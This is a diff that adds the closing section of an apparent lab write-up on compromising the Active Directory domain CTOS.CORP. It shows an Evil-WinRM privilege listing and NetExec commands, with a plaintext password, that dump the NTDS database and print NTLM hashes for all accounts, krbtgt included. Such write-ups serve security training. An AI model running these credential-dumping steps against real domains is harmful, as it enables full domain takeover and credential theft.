@@ -1304,7 +1304,78 @@ Info: Establishing connection to remote endpoint
 ```
 
 ```python
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
+
+Domain admin, now i can use these privs to dump the NTDS and get the krbtgt account hash needed to complete the challenge
+
+```python
+nxc smb dc01.ctos.corp -u john -p 'H4x00r123..'                            
+SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\john:H4x00r123.. (Pwn3d!)
+                                                                                                              
+┌──[kali@kali]──[192.168.86.130]──[~/hsm/CTOS/pyGPOAbuse]──[ master]
+└───╼ $ nxc smb dc01.ctos.corp -u john -p 'H4x00r123..' --ntds
+SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\john:H4x00r123.. (Pwn3d!)
+SMB         10.1.201.146    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.1.201.146    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:b98fef8c727317dafcd2a2633a87e3a6:::
+SMB         10.1.201.146    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.1.201.146    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:472f0b524999441cdd9e3c5d7480ec0d:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\j_wilson:1108:aad3b435b51404eeaad3b435b51404ee:408f35ae30ecf365a9f7443644deab40:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\l_conrad:1109:aad3b435b51404eeaad3b435b51404ee:01d1b3361425743346aa3eee1e183228:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\m_chen:1110:aad3b435b51404eeaad3b435b51404ee:3c1e5eaf9adaf22d04b31be58b8eb1b2:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\s_patel:1111:aad3b435b51404eeaad3b435b51404ee:6ea83095c96646f602b7e224e73bf24f:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\e_rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:8f64d35c7637d37b8ad2562371c09ba4:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\d_kim:1113:aad3b435b51404eeaad3b435b51404ee:2ed9396b03542875c6d67f6364a04a26:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\it_ops_lead:1114:aad3b435b51404eeaad3b435b51404ee:fd8bd0720fec58d0b5005257dd9f3723:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\svc_web:1115:aad3b435b51404eeaad3b435b51404ee:4014777d5f38cb74d24f096972f47969:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\svc_backup:1116:aad3b435b51404eeaad3b435b51404ee:33874be11f1c8201c492a265d3fbe6be:::
+SMB         10.1.201.146    445    DC01             CTOS.CORP\svc_infra_mgr:1117:aad3b435b51404eeaad3b435b51404ee:27c3310b819ee7aca17fdcd46cc4d6f3:::
+SMB         10.1.201.146    445    DC01             john:3101:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
+SMB         10.1.201.146    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c21e10d8df3d7c2f1bc978b076c05f97:::
+SMB         10.1.201.146    445    DC01             IT-WS01$:1118:aad3b435b51404eeaad3b435b51404ee:440325e058a2e53086f398b31bf5c707:::
+SMB         10.1.201.146    445    DC01             WEB-01$:1119:aad3b435b51404eeaad3b435b51404ee:78c84333dd4474982b203b082b797fed:::
+SMB         10.1.201.146    445    DC01             [+] Dumped 17 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.201.146_2026-09-02_154228.ntds of which 14 were added to the database
+SMB         10.1.201.146    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.1.201.146    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.201.146_2026-09-02_154228.ntds | cut -d ':' -f1
+```
+
+I now have the contents to finish the lab!
+
+
 
 
